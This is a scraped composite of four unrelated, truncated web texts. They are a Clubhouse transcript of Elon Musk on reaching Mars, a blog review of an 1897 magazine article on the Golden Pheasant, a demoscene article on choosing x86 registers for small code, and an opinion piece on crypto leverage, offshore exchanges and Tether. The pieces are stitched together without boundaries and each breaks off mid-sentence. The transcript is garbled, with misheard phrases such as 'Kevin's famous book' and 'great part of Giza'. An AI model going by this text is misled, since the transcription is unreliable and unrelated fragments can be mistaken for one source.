<p>&lt;&lt;00:00:40&gt;&gt;<br>
Elon Musk: No. I'm just trying to look sexy and in these tight pants with the. You now fabulous red in the gold.</p>
<p>&lt;&lt;00:00:47&gt;&gt;<br>
Marc: Are the short shorts still available to be purchased.</p>
<p>&lt;&lt;00:00:55&gt;&gt;<br>
Elon Musk: Sorry, I got a small barkly dog.</p>
<p>&lt;&lt;00:00:59&gt;&gt;<br>
Sriram: Elon, I think you're, you've might have broken. I'm not sure about the internet, but definitely clubhouse. This room is easily the biggest room. The app has had and you're just putting on all sorts of pressure on it. This is amazing. This is a true historic moment.</p>
<p>&lt;&lt;00:01:15&gt;&gt;<br>
Elon Musk: All right. Is it working? <em>laught</em></p>
<p>&lt;&lt;00:01:18&gt;&gt;<br>
Sriram: Absolutely, abso-effing-lutely.</p>
<p>&lt;&lt;00:01:23&gt;&gt;<br>
Elon Musk: All right.</p>
<p>&lt;&lt;00:01:25&gt;&gt;<br>
Sriram: All right. We're gonna just give it a minute because we promised we'd start at 10:00 PM and I think a few more people are going to try and trickle in, and then we'll get going we'll get going for what should be probably a historic first ever time for you on clubhouse.It's going to be amazing. Just do 30 seconds. And you're already doing it.</p>
<p>&lt;&lt;00:01:41&gt;&gt;<br>
Elon Musk: Okay. Oh by the way can you let in Vlad from Robinhood?</p>
<p>&lt;&lt;00:01:50&gt;&gt;<br>
Marc: We can</p>
<p>&lt;&lt;00:01:52&gt;&gt;<br>
Elon Musk: Okay.</p>
<p>&lt;&lt;00:01:53&gt;&gt;<br>
Marc: I'm sorry, Shriram, sorry</p>
<p>&lt;&lt;00:01:56&gt;&gt;<br>
Sriram: I was gonna say you know I've been, I, My phone just blew up with when we started the room with people trying to get into it, we're going to try and get asking to be on top of it. Okay. Why don't we get started? Okay. Uh first of all, everyone thank you for joining us for what is really a historic episode.</p>
<p>I will come to our very special guest in a second, but just to quickly introduce the rest of this room. We have Garry Tan, of Initialized Capital. We have my significantly better other half Aarthi Ramamurthy, whom, Elon you've met when you took us on the tour of Space X. We have Steven Sinofsky, um, of ex-Microsoft and we have the one and only Marc Andreessen. But to introduce our special guests and this person truly needs  introduction.<br>
The founder of Tesla, Space X, the Boring Company, Neuralink, PayPal and a bunch more.. Elon Musk, welcome to Clubhouse.</p>
<p>&lt;&lt;00:02:48&gt;&gt;<br>
Elon Musk: Thank you.</p>
<p>&lt;&lt;00:02:50&gt;&gt;<br>
Sriram: Thank you. Okay.</p>
<p>&lt;&lt;00:02:51&gt;&gt;<br>
Aarthi: This is awesome. Yeah. Yeah. So, Elon again, welcome. This is really fun. Uh we've been waiting all day. This is the longest way to 10:00 PM because we just couldn't wait to get this going. I hope this is as much fun be the end of it for you as it is for us. First question from me - was is when are we going to get to Mars?</p>
<p>&lt;&lt;00:03:11&gt;&gt;<br>
Elon Musk: I think we'll get to when will we get the first people to Mars? I think we have a decent shot of doing that in about I'd say like... I call it five years, something like that.</p>
<p>So Earth to Mars sync up every 26 months. That's when we're in this kind of the, it's roughly the same quadrant of the solar system and where we can do an interplanetary transfer. And  so we had one about six months ago, so about a year and a half there'll have be another one. So figure, I don't know five and a half years.</p>
<p>&lt;&lt;00:03:44&gt;&gt;<br>
Aarthi: Five and a half years. So what does  take from here to that point what are the milestones you think for us to get to, five years out, we are landing on Mars?</p>
<p>&lt;&lt;00:03:54&gt;&gt;<br>
Elon Musk: We've got to make a starship fly get it, gets go to orbit and back repeatedly. I mean, the essential elements are you need a fully reusable, but like, um... You need a fully and rapidly reusable rock.. orbital rocket. This is the Holy Grail of rocketry. So no one has ever succeeded in creating a fully reusable rocket and it can't just be fully reusable.</p>
<p>It needs to be rapidly reusable. So it doesn't take like several months of refirbish-ment between flights. It needs to be much like aircraft where the cost of an air flight is the biggest component of that is fuel. And you can't just be throwing rockets away every time.</p>
<p>And then you need to have orbital refilling, so where you can end the ship up to orbit then send another ship up dock with a transport propellant so that you can load up to being almost full propellant and then go to Mars.<br>
And if you've got a large, fully rapidly reusable rocket with orbital refilling that uses, high efficiency, low cost propellant then you can go to Mars and then..</p>
<p>And then one other one last thing is on Mars too you need local  propellant production. So you take CO2 out of the atmosphere combine it with the water ice - H2O to create CH4 methane and oxygen.</p>
<p>And f you have those elements - life can become multi-planetary and we can have a self-sustaining city on Mars, which I think is one of the most important things. We could possibly do for   ensuring the long-term existence of conscious consciousness.</p>
<p>&lt;&lt;00:05:25&gt;&gt;<br>
Sriram: Elon, you've spoken about this often, which is, expanding the scope of consciousness and how it is tied to multiplanetary life. Could you explain what that means for you and why that matters to you?</p>
<p>&lt;&lt;00:05:39&gt;&gt;<br>
Elon Musk: Sure, so the... originally, I had  an existential crisis when I was a kid trying to figure out what's the meaning of life? Why are we here? What's the point of it all? Is it all meaningless?<br>
I got quite depressed actually and sad about it.  And then the thing that kind of broke me out of it was reading Douglas Adams is a Hitchhiker's Guide to the galaxy.</p>
<p>Where he essentially pointed out that the universe is the answer and really the hard part is figuring out what questions to ask about the answer that is the universe.</p>
<p>I'm trying to make fun of the fact that the answer is the , easy part, but the questions are the hard part. So in order for us to gain  a better understanding of what questions to ask or to understand.  What it's all about. We have to increase the scope and scale of consciousness so that we're better able to figure out which questions to ask them and answer them. So the longer, the broader in scope larger in scale, that consciousness is the more likely we are to be able to ask these questions and figure out what that's going on.</p>
<p>Why are we here to answer the fundamental questions? And  I think there's arguably a great filter that we face with you know, will we've become a multi-class species or not. We’ll be surprised if out there in our galaxy and others,  there are a whole bunch of... Dead one planet civilizations that prosper.. prospered for a while, they might've prospered for millions of years, but then gradually the civilization collapsed for reasons external or internal.</p>
<p>And that was that all civilization go through  go through an arc where they both, they grow up in technology complexity, but then  they don't keep going up. They, over time they... hey decline they fall and this has happened obviously with if you're a student of history with many civilizations in the past. You can look at ancient Egypt, 5,000 years ago, there was the great part of Giza, but then the people living there forgot how to build pyramids after a while and then they forgot how to read hieroglyphics.</p>
<p>There's obviously, Kevin's famous book about the decline and fall of the Roman Empire and how they had advanced technology in terms of roads, aqueducts plumbing and so forth and then they basically forgot about it .<br>
The ancients Sumerians, Babylonians - all these things have been all gone through a similar arc  which suggests that most likely we will go through such ourselves and we'll be arguably less resilient to recovery because of globalization.</p>
<p>So I think, for the first time in the four and a half billion year history of Earth that has been possible to extend life beyond Earth and make life multi-planetary. And this window of opportunity may be open for a long time. I hope it is, or it may be open for a short time. And I think it would be wise for us to assume that it's open for a short time.</p>
<p>I'm an optimist, not a pessimist, but I, you have to say there's some chance it's only open for a short time and we should take advantage of this brief window of opening, where we can transfer, transfer life, transport life to make life multi-planetary and humanity is essentially the agent of life in this process.</p>
<p>And I think we almost have an obligation to ensure that the creatures of Earth continue even if there was a calamity on Earth, which as I said, could be man-made or it could be some natural calamity as if you look at the fossil record there's, there are many mass extinctions.</p>
<p>&lt;&lt;00:09:02&gt;&gt;<br>
Aarthi: Yeah, I think, all of that makes sense and I think we've heard, you've talked about this before. I think one other question I have is, when we get there, we have to set up the whole society. We have to set up civilization there. Um how will the whole thing work in your mind? Like, you know, everything from what does it mean to have internet connection on Mars? All the way to like governments and rules …</p></div></div></div></div>

The serial’s Golden Pheasant article is shorter than the articles for the first three birds that we covered, so this post may be shorter as well. But the Golden Pheasant is no less striking than the <a href="https://thenewleafjournal.com/bird-in-review-the-nonpareil-or-northern-bunting/">Nonpareil</a>, <a href="https://thenewleafjournal.com/bird-in-review-resplendent-trogon/">Resplendent Trogon</a>, and <a href="https://thenewleafjournal.com/bird-in-review-mandarin-duck/">Mandarin Duck</a>, so perhaps the content will pack just as much of a peck. I apologize for the pun. To avoid further humor-related injuries, let us proceed to the review of the Golden Pheasant, and assess whether this 1897 children’s literature holds up in 2021.</p><p>You can follow along with the original Golden Pheasant content at <a aria-label=" (opens in a new tab)" href="https://www.gutenberg.org/files/30221/30221-h/30221-h.htm" target="_blank" rel="noreferrer noopener">Project Gutenberg</a> and <a href="https://archive.org/details/birdscolormag00marbrich/page/12/mode/2up">The I</a><a aria-label="n (opens in a new tab)" href="https://archive.org/details/birdscolormag00marbrich/page/12/mode/2up" target="_blank" rel="noreferrer noopener">n</a><a href="https://archive.org/details/birdscolormag00marbrich/page/12/mode/2up">ternet Archive</a>.</p> <h2>The Golden Pheasant, Illustrated</h2><p>Below, you will find the magazine’s illustration of the Golden Pheasant.</p><div><figure><img loading="lazy" width="600" height="451" src="https://thenewleafjournal.com/wp-content/uploads/2021/01/the-golden-pleasant-birds-monthly-serial.jpg" alt="Illustration of the Golden Pheasant, clipped from the January 1897 Birds: A Monthly Serial." srcset="https://thenewleafjournal.com/wp-content/uploads/2021/01/the-golden-pleasant-birds-monthly-serial.jpg 600w, https://thenewleafjournal.com/wp-content/uploads/2021/01/the-golden-pleasant-birds-monthly-serial-300x226.jpg 300w, https://thenewleafjournal.com/wp-content/uploads/2021/01/the-golden-pleasant-birds-monthly-serial-500x375.jpg 500w" sizes="(max-width: 600px) 100vw, 600px"><figcaption>Illustration of The Golden Pheasant clipped from the magazine on Project Gutenberg</figcaption></figure></div><p>The Golden Pheasant continues our trend of colorful birds, with shades of red, green, yellow, and brown. Its “hair” on the top of its head may set it apart from the first three. What is that, exactly? Let us ask the Golden Pheasant himself.</p> <h2>Comments from Mr. Golden Pheasant</h2><p>The <em>Birds </em>magazine continued its concept of beginning specific bird content with a brief statement from the bird himself. In the case of the Golden Pheasant, there was an emphasis on “brief.” While the first three birds we covered each had a full-page statement or letter, the Golden Pheasant received just under half a page. Before one suggests that the Golden Pheasant was slighted, a few of the later birds that we will cover were not asked for comment at all. As we will see at the end, Mr. Golden Pheasant did get a poem in his honor to make up for the lower word count. I will cover the magazine’s poems in a separate post after finishing the rest of the bird content.</p><p>I now yield the floor to Mr. Golden Pheasant. How do we know it is “Mr.” Golden Pheasant? Well, he says so.</p><h3>Mr. Golden Pheasant’s Regal Regalia</h3><p>Where does Mr. Golden Pheasant’s name come from? “They call me the Golden Pheasant, because I have a golden crest.” What does that golden crest remind Mr. Golden Pheasant of? “It is like a king’s crown.” What a regal bird, indeed. Mr. Golden Pheasant agreed: “Don’t you think my dress is beautiful enough for a king?”</p><h3>Mr. Golden Pheasant’s Size</h3><p>Mr. Golden Pheasant made sure to tell children that he was a “very large bird,” standing “fourteen inches tall and twenty-eight inches long.” He gave an example of what this size would allow him to do: “I can step right over your little robins and meadow larks and blue jays and not touch them.” Do you hear that, nineteenth century American children? This mighty bird would scoff as he stepped <em>over</em> the puny little birds in your backyard. Take that. He is much smaller than <a href="https://thenewleafjournal.com/welcome-to-the-emu-cafe/">our own Mr. Emu here at <em>The New Leaf Journal</em></a><em>,</em> however. Couldn’t be this cocky if the <em>Bird </em>magazine was published in Australia. He noted blue jays too – I covered those in a separate matter.</p><p>With Mr. Golden Pheasant’s height, one might wonder whether he could readily reach things on the ground. Have no fear. “See the large ruff around my neck. I can raise and lower it as I please.”</p><h3>Egg Thieves!</h3><p>Mr. Golden Pheasant explained that sometimes, his Golden Pheasant eggs were stolen. “Sometimes people get some of our eggs and put them under an old hen.” Lest one worry about the hatchlings, “the hen is very good to them.” However, Mr. Golden Pheasant stated that although the hen is good to the little Golden Pheasants, “they do not wish to stay with her; they like their wild life.”</p><p>Why were eggs so often taken by people that Mr. Golden Pheasant had to make a note of it? A clue comes in the next section. There, Mr. Golden Pheasant explained that he and his wife “like to have our nests by a fallen tree.” <a href="https://thenewleafjournal.com/the-fallen-tree-in-brooklyn-heights/">Fallen tree</a>? Well, I suppose that would make it easier for people to take the eggs. Other birds, like the <a href="https://thenewleafjournal.com/bird-in-review-resplendent-trogon/">Resplendent Trogon</a>, stick to nests not only high in the trees, but also high in the mountains.</p><h3>Mr. Golden Pheasant’s Wife</h3><p>Mr. Golden Pheasant was married. Regarding his wife, “[h]er feathers are beginning to grow like mine.” What did this mean? “In a few years she will look as I do.” In light of this revelation, I suppose that it was necessary for Mr. Golden Pheasant to state his sex outright.</p> <h2>Golden Pheasant Facts</h2><p>Mr. Golden Pheasant returned to his fallen-tree nest and the editors of <em>Birds: A Monthly Serial </em>took the stage to tell us more about the gold-crested bird.

The magazine did make reference to this event – “It has been introduced into Europe, but is fitted only for the aviary.” Today, Golden Pheasants <a aria-label=" (opens in a new tab)" href="https://en.wikipedia.org/wiki/Golden_pheasant#Description" target="_blank" rel="noreferrer noopener">are found</a> in North America, South America, and parts of Western and Northern Europe.</p><h3>An Entry on Entrees</h3><p>In the last bird review, we learned that the Chinese valued the <a href="https://thenewleafjournal.com/bird-in-review-mandarin-duck/">Mandarin Ducks</a> for their aesthetic qualities and for their fidelity to one another. Here, we learn that the Chinese valued the Golden Pheasant “not only for its splendid plumage and elegant form, but for the excellence of his flesh, which is said to surpass even that of the common pheasant.” So begins the discussion of Golden Pheasants for dinner.</p><p>The magazine noted optimistically that, despite the Golden Pheasant’s being considered a delicacy, “[f]or purposes of the table it is not likely to come into general use…” Why so? “[T]here are great difficulties in the way of breeding it in sufficient numbers…” That fact likely explains why Mr. Golden Pheasant complained about humans stealing eggs from feral Golden Pheasant nests. If they could not be readily bred domestically, the eggs would have to be pilfered from the wild.</p><p>The magazine further suggested that the general adoption of Golden Pheasants for the dinner table was hindered by the fact that “one feels a natural repugnance to the killing of so beautiful a bird for the sake of eating it.”</p><p>The conservation status of the Golden Pheasant <a aria-label=" (opens in a new tab)" href="https://en.wikipedia.org/wiki/Golden_pheasant" target="_blank" rel="noreferrer noopener">is currently</a> “Least Concern,” and none of the contemporary sources make special note of people eating them. This all comes together to suggest that the optimism of the editors of <em>Birds: A Monthly Serial, </em>was well-founded. They are common in aviaries, however, suggesting that they can, in fact, be bred in captivity without too much difficulty.</p><h3>The Colors of the Golden Pheasant</h3><p>Like most of the other birds we covered, the male Golden Pheasants are generally more colorful than the females. “The magnificent colors belong only to the male, the female being reddish brown, spotted and marked with a darker hue.” Furthermore, “[t]he tail of the female is short.” What did Mr. Golden Pheasant mean when he suggested that his wife would soon look the same as him then? “The statement is made, however, that some hens kept for six years by Lady Essex gradually assumed an attire like that of the males.”</p><p>A quick search of contemporary sources revealed no reference to female Golden Pheasants adopting the bright colors of their male counterparts. <a aria-label=" (opens in a new tab)" href="https://en.wikipedia.org/wiki/Golden_pheasant" target="_blank" rel="noreferrer noopener">Wikipedia notes</a>, however, that “[t]here are … different mutations of the golden pheasant known from birds in captivity, including the dark-throated, yellow, cinnamon, salmon, peach, splash, mahogany and silver.” This passage does not sound similar to the story of Lady Essex’s lady Golden Pheasants.</p><p>According to Animals Network, the reason why female Golden Pheasants are not colorful is because they “can’t afford showy features and gaudy colors, not when they have a brood to raise.” It continues, “[t]heir brown color helps them blend in with their surroundings, better allowing them to incubate eggs and raise chicks.” Perhaps Lady Essex’s Golden Pheasant hens became more colorful because they did not have to fear predators? It seems a bit unlikely, but who knows?</p><h3>Fly-Fishers and Golden Pheasant Feathers</h3><p>The editors of <em>Birds </em>stated that Golden Pheasants were much admired by the fishing community. “Fly-fishers highly esteem the crest and feathers on the back of the male, as many of the artificial baits owe their chief beauty to the Golden Pheasant.”</p><h3>The Chinese Name</h3><p>The editors wrote that that the Chinese called the Golden Pheasant “Keuki” or “Keukee.” That meant “gold flower fowl.” The editors cited to Latham’s “General History of Birds,” published in 1896, for this fact. I found no alternative source that cites to it. Latham’s <a href="https://archive.org/stream/BirdsAsiaJohnGoVIIGoul/BirdsAsiaJohnGoVIIGoul_djvu.txt">stated</a> that the name also means “wrought fowl,” noting its hardiness. If any Mandarin speakers read this, feel free to explain in the Guestbook whether Latham’s was correct.</p> <h2>The Golden Coronation</h2><p>The Golden Pheasant article was lighter on content than the first three bird posts, but still enlightening. Nothing in the post was completely out-dated. Furthermore, it offered a few interesting anecdotes that would not be easy to find today. The story of Lady Essex’s hens is interesting, although perhaps dubious. Latham’s discussion of the Golden Pheasant’s name in Chinese is worth looking into. The fly-fisherman anecdote was noteworthy.</p><p>The article discussed the subject of Golden Pheasant hunting without descending into gratuitous bird violence, as it did with the Resplendent Trogon. …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p><i>I wrote this article for an online magazine called <a href="http://www.scenerep.org/scenezine/issue12.php">Scene Zine</a>. Scene Zine caters to the Demo Scene, which is an digital art community dedicated to pushing the limits of computers through a mix of music, art, and computer programming. A particular category of demoscene productions, 4K intros, focus on the final production's raw file size. The goal is to put as much high-quality music, graphics, and animation as possible into only 4096 bytes. Doing this requires highly-specialized size optimization techniques, since 4096 bytes is less space than two pages of typed text or a true-color Windows XP icon. This article discusses some of these techniques.</i></p>

<p>Some people have commented that they want to see more expert programming articles in Scene Zine. To remedy the situation, this article is for all assembly language programmers out there. It discusses the fine art of picking which registers to use in your code. This information should simplify your coding and help you write smaller routines.</p>

<p>When the engineers at Intel designed the original 8086 processor, they had a
special purpose in mind for each register. As they designed the instruction
set, they created many optimizations and special instructions based on the
function they expected each register to perform. Using registers according to
Intel's original plan allows the code to take full advantage of these
optimizations. Unfortunately, this seems to be a lost art. Few coders are aware
of Intel's overall design, and most compilers are too the simplistic or focused
on execution speed to use the registers properly. Understanding how the
registers and instruction set fit together, however, is an important step on
the road to effortless size-coding.</p>

<p>Using the registers consistently has other advantages besides size
optimization. Like using good variable names, using consistent registers makes
code more readable. When they are used properly, the registers have meanings
almost as clear as the loop counter, <var>i</var>, in higher-level languages. In fact, I
occasionally name my variables in C after x86 registers because the register
names are so descriptive. With proper register use, x86 assembler can be almost
as self-documenting as a high-level language.</p>

<p>Another benefit that consistent register use brings is better compression. In
productions which use a compressor to pack the final build, such as 4K intros,
creating more redundant code leads to smaller packed sizes. When code uses
registers consistently, the same instruction sequences begin to appear over and
over. This, in turn, improves the compression ratio.</p>

<p>As a review, all x86-family CPU's have 8 general-purpose registers. The
registers are 32 bits wide, although 16-bit versions are also accessible with a
special one-byte instruction prefix. In 16-bit mode, the situation is reversed.
The lower 16 bits are accessible by default, and the full registers are
accessible only with a prefix byte.</p>

<p>Each register name is really an acronym. This is true even for the
"alphabetical" registers EAX, EBX, ECX, and EDX. The following list shows the
register names and their meanings:</p>

<ul>
<li>EAX - Accumulator Register</li>
<li>EBX - Base Register</li>
<li>ECX - Counter Register</li>
<li>EDX - Data Register</li>
<li>ESI - Source Index</li>
<li>EDI - Destination Index</li>
<li>EBP - Base Pointer</li>
<li>ESP - Stack Pointer</li>
</ul>

<p>In addition to the full-sized general registers, the x86 processor also has
eight byte-sized registers. Since these registers map directly into EAX, EBX,
ECX, and EDX, most people view them as parts of the larger registers. From the
instruction set point of view, however, the 8-bit registers are separate
entities. For example, the CL and CH registers share none of the ECX register's
useful properties. Except for AL and AH, none of the 8-bit registers have any
special significance in the instruction set, so this article does not mention
them.</p>

<h3>EAX: The Accumulator</h3>

<p>There are three major processor architectures: register, stack, and
accumulator. In a register architecture, operations such as addition or
subtraction can occur between any two arbitrary registers. In a stack
architecture, operations occur between the top of the stack and other items on
the stack. In an accumulator architecture, the processor has single calculation
register called the accumulator. All calculations occur in the accumulator, and
the other registers act as simple data storage locations.</p>

<p>Obviously, the x86 processor does not have an accumulator architecture. It
does, however, have an accumulator-like register: EAX / AL. Although most
calculations can occur between any two registers, the instruction set gives the
accumulator special preference as a calculation register. For example, all nine
basic operations (ADD, ADC, AND, CMP, OR, SBB, SUB, TEST, and XOR) have special
one-byte opcodes for operations between the accumulator and a constant.
Specialized operations, such as multiplication, division, sign extension, and
BCD correction can only occur in the accumulator.</p>

<p>Since most calculations occur in the accumulator, the x86 architecture contains
many optimized instructions for moving data in and out of this register. To
start, the processor has sixteen byte-sized XCHG opcodes for swapping data
between the accumulator and any other register. These aren't terribly useful,
but they show how strongly the Intel engineers preferred the accumulator over
the other registers. For them, it was better to swap data into the accumulator
to than to work with it where it was. Other instructions that move data in and
out of the accumulator are LODS, STOS, IN, OUT, INS, OUTS, SCAS, and XLAT.
Finally, the MOV instruction has a special one-byte opcode for moving data into
the accumulator from a constant memory location.</p>

<p>In your code, try to perform as much work in the accumulator as possible. As
you will see, the remaining seven general-purpose registers exist primarily to
support the calculation occurring in the accumulator.</p>

<h3>EDX: The Data Register</h3>

<p>Of the seven remaining general-purpose registers, the data register, EDX, is
most closely tied to the accumulator. Instructions that deal with over sized
data items, such as multiplication, division, CWD, and CDQ, store the most
significant bits in the data register and the least significant bits in the
accumulator. In a sense, the data register is the 64-bit extension of the
accumulator. The data register also plays a part in IO instructions. In this
case, the accumulator holds the data to read or write from the port, and the
data register holds the port address.</p>

<p>In your code, the data register is most useful for storing data related to the
accumulator's calculation. In my experience, most calculations need only these
two registers for storage if they are written properly.</p>

<h3>ECX: The Count Register</h3>

<p>The count register, ECX, is the x86 equivalent of the ubiquitous variable i.
Every counting-related instruction in the x86 uses ECX. The most obvious
counting instructions are LOOP, LOOPZ, and LOOPNZ. Another counter-based
instruction is JCXZ, which, as the name implies, jumps when the counter is 0.
The count register also appears in some bit-shift operations, where it holds
the number of shifts to perform. Finally, the count register controls the
string instructions through the REP, REPE, and REPNE prefixes. In this case,
the count register determines the maximum number of times the operation will
repeat.</p>

<p>Particularly in demos, most calculations occur in a loop. In these situations,
ECX is the logical choice for the loop counter, since no other register has so
many branching operations built around it. The only problem is that this
register counts downward instead of up as in high level languages. Designing a
downward-counting is not hard, however, so this is only a minor difficulty.</p>

<h3>EDI: The Destination Index</h3>

<p>Every loop that generates data must store the result in memory, and doing so
requires a moving pointer. The destination index, EDI, is that pointer. The
destination index holds the implied write address of all string operations. The
most useful string instruction, remarkably enough, is the seldom-used STOS.
STOS copies data from the accumulator into memory and increments the
destination index. This one-byte instruction is perfect, since the final result
of any calculation should be in the accumulator anyhow, and storing results in
a moving memory address is a common task.</p>

<p>Many coders treat the destination index as no more than extra storage space.
This is a mistake. All routines must store data, and some register must serve
as the storage pointer. Since the destination index is designed for this job,
using it for extra storage is a waste. Use the stack or some other register for
storage, and use EDI as your global write pointer.</p>

<h3>ESI: The Source Index</h3>

<p>The source index, ESI, has the same properties as the destination index. The
only difference is that the source index is for reading instead of writing.
Although all data-processing routines write, not all read, so the source index
is not as universally useful. When the time comes to use it, however, the
source index is just as powerful as the destination index, and has the same
type of instructions.</p>

<p>In situations where your code does not read any sort of data, of course, using
the source index for convenient storage space is acceptable.</p>

<h3>ESP and EBP: The Stack Pointer and the Base Pointer</h3>

<p>Of the eight general purpose registers, only the stack pointer, ESP, and the
base pointer, EBP, are widely used for their original purpose. These two
registers are the heart of the x86 function-call mechanism. When a block of
code calls a function, it pushes the parameters and the return address on the
stack. Once inside, function sets the base pointer equal to the stack pointer
and then places its own internal variables on the stack. From that point on,
the function refers to its parameters and variables relative to the base
pointer rather than the stack pointer. Why not the stack pointer? For some
reason, the stack pointer lousy addressing …</p></div></div>

<p>Since crypto’s near-death experience of March 2020, three things have risen in tandem: the price of Bitcoin, the market cap of Tether, and the number of people under lockdown at home, turning to day-trading as a way to kill time. These three trends are closely intertwined.</p>



<p>An image is worth a thousand words, so just have a look at this chart of Robinhood users’ activity:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/49736731-15924900361928709.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/49736731-15924900361928709.png 636w, http://www.tr0lly.com/wp-content/uploads/2021/02/49736731-15924900361928709-300x221.png 300w" sizes="(max-width: 636px) 100vw, 636px"><figcaption>source: seekingalpha.com</figcaption></figure>



<p>A combination of high markets’ volatility, stimulus checks, and having nothing better to do, has led millions of people to start trading – or gambling, depending on your opinion on the financial markets.</p>



<p>Robinhood is one way to have fun, betting on stocks. But there’s another, much more adrenaline-fuelled alternative: crypto. The keyword is leverage. Stock trading apps will allow you to lever your trades 3, 4 or 5 times, depending on their assessment of market volatility and the risk of not being able to close your position in time. Unregulated crypto exchanges like Binance will offer you up to 125x leverage. Now that’s gambling on steroïds.</p>



<p>This leverage is the lifeblood of the crypto economy. To understand how it works, allow me to entertain you with a short story.</p>



<h3>Online Forex trading and leverage</h3>



<p>A long time ago, BNP Paribas bought a retail forex exchange, because they thought they’d get an insight into forex trading flows and positions. What they quickly discovered, is that the website was a muppet slaughterhouse.</p>



<p>People would get stopped out ALL THE TIME because they used too much leverage. Over 90% of them lost money in a consistent way. Those are worse than even casino odds. That’s why around 2005, you had so many forex trading websites popping up. They would offer up to 500x leverage. Anyone using that leverage would get wiped out in minutes by random moves. The trading websites wouldn’t even hedge their overall positions – the certainty of loss was that great. Because of this, the business was extremely lucrative.</p>



<p>The higher the leverage, the better (for the website). This became such a huge trend that regulators stepped in, and introduced maximum leverage rules. Something like x30 for forex, if I remember correctly. All of a sudden, all the ads and Premier League sponsorships vanished.</p>



<p>Forex gambling is still around, but not nearly as profitable, because it takes time for people to lose their money with a pitiful x30 leverage. Currencies usually don’t move by 3% in a day. It can take weeks for an amateur trader to lose it all. Plus the adrenaline rush is gone.</p>



<h3>Crypto trading and illegal leverage</h3>



<p>Enter crypto. It’s hard to overstate how one-sided leveraged crypto trading is. Traders don’t stand a chance. With currencies, you could expect to extract SOME money from real world flows. In crypto, there are no real world flows. It’s just traders against traders against insiders.</p>



<p>Of course leveraged trading is very fun and addictive. So the flows are substantial. Regulated exchanges don’t offer leverage, because it’s a pain in the ass legally – <a href="https://www.coindesk.com/coinbase-ends-margin-trading">just look at Coinbase dropping it recently</a>. Because cryptos aren’t currencies, you have to deal with all this crap about ownership and being able to deliver the goods that’s very hard to process. Plus the CFTC thinks cryptos are commodities, while the SEC thinks they’re securities, and you have to deal with regulations for both.</p>



<p>That’s why offshore, unregulated exchanges sprung up so fast to offer leveraged crypto trading while bypassing those pesky regulators. Being unregulated offshore operations, it’s very hard for them to establish and maintain banking relationships, so they rely on cryptocurrencies, mainly Bitcoin, as a means for their clients to top up their accounts. If you’re a US resident, you can’t deposit money on Binance using your credit card. Instead, you go on Coinbase, buy Bitcoin, and send it to Binance.</p>



<p>Those exchanges are an absolute bonanza, precisely because they create this huge demand for crypto for on-ramp purposes. This crypto is then lost by gamblers, thanks to insane leverage, back to the crypto industry. This creates a one-way flow of real cash into the system.</p>



<p>Of course, these unregulated exchanges are also a huge threat to the crypto industry, because they’re serving US residents, which is illegal, and regulated exchanges knowingly serve as on-ramp platforms and enable US citizens to fund their gambling accounts there. It all hangs on a very thin thread.</p>



<h3>Illegal gambling: the real source of revenue for crypto</h3>



<p>Offering people to buy Bitcoins to hold isn’t nearly as interesting a business as offering people to buy Bitcoins to fund their gambling addiciton, and lose them by getting stopped out on Binance. A HODLer is a risk because he can sell his Bitcoins. A rekt gambler will simply buy more.</p>



<p>Unregulated offshore exchanges are feeding the rest of the crypto industry. They’re also feeding regulated exchanges, who serve as on-ramp platforms. It has become such a huge business that, just like with forex, regulators are looking into it. The <a href="https://www.vanityfair.com/news/2021/02/the-rise-and-fall-of-bitcoin-billionaire-arthur-hayes">story of Arthur Hayes</a>, the billionaire cofounder of BitMex currently hiding from prosecutors in New York, is one example of authorities breathing down the neck of these underground casinos posturing as exchanges.</p>



<p>These exchanges couldn’t exist without crypto – not least because there wouldn’t be anything to trade, but also because they couldn’t accept customer deposits or meet redemption requests. Were they to rely on traditional banking relationships, a regulator would simply need to call their bank, and order them to shut down their account (just like <a href="https://cryptonewsreview.com/bitfinex-suspends-fiat-deposits-amid-rumours-of-hsbc-withdrawal/">what happened to Bitfinex with HSBC</a>).</p>



<p>But thanks to this multi-layered system where regulated entities (like Coinbase) allow people to buy Bitcoin, and then help them to send this Bitcoin to less-regulated and/or unregulated entities like BitMex or Binance, everyone benefits. This way of doing things goes back to 2013, when the <a href="https://www.fincen.gov/resources/statutes-regulations/guidance/application-fincens-regulations-persons-administering">FinCEN ruled that crypto exchanges are money transmitters</a>, which was an incredibly generous classification, as it absolved the exchanges from performing AML and KYC on crypto transactions.</p>



<p>This very classification is currently under attack from regulators now, with the STABLE Act, and calls for regulating self-hosted wallets. It’s probably the reason why PayPal chose not to allow people to withdraw their crypto.</p>



<h3>March 2020: the day when Tether got its wings</h3>



<p>While gambling addicts might not care about having to go through Bitcoin to fund their accounts, exchanges themselves would be in a tough spot if they had to rely exclusively on this volatile and cumbersome cryptocurrency to manage your day-to-day operations. Imagine having your liabilities fixed in USD, when your income and assets fluctuate in value by 10% every few hours.</p>



<p>It’s much more convenient to have something that’s stable in price, and can be transferred in seconds. This is where Tether steps in, by offering their stablecoin, USDT. <em>(more precisely, they stepped in gradually, because them relying on the OMNI layer, which itself relies on Bitcoin, made transactions slow and unreliable in moments when the Bitcoin network became clogged – an issue that was solved by launching an ERC-20 USDT token in September 2017).</em></p>



<p>USDT does have one major flaw, however – it’s controlled by a central party, Tether. By holding USDT, you are accepting Tether’s credit risk, which is a scary thought, knowing that they aren’t audited or regulated, and are currently under investigation by the NYAG. USDT tokens can be frozen, and there’s no guarantee that you’ll be able to cash out. It’s probably for these reasons that USDT usage remained subdued for quite a while.</p>



<p>But then, something happened. Unbeknownst to most, March 2020 was a crucial turning point for the crypto ecosystem.</p>



<blockquote><p lang="en" dir="ltr">8. The recent rapid increase in USDT issuance since March and then since Oct are entirely explained by (1) post 03/20 there was a sustained mass move away from BitMEX (which margins their deriv contracts in BTC) towards Binance (which margins mostly in USDT)…</p>— David Fauchier (@dfauchier) <a href="https://twitter.com/dfauchier/status/1350741887095873537?ref_src=twsrc%5Etfw">January 17, 2021</a></blockquote> 



<p>For some reason, major unregulated exchanges suddenly warmed up to the idea of holding a lot of USDT on their books. The switch from Bitcoin as collateral, to USDT for margin trading, meant that Binance was cool with having a multi-billion dollar exposure to Tether, a <a href="https://thecaspiancey.medium.com/finding-finex-3eefac0d45a2">small unaudited company with no office, whose CEO and CFO are MIA</a>.</p>



<p>Only insiders know the true reasons behind this shift, but my take is quite straightforward:</p>



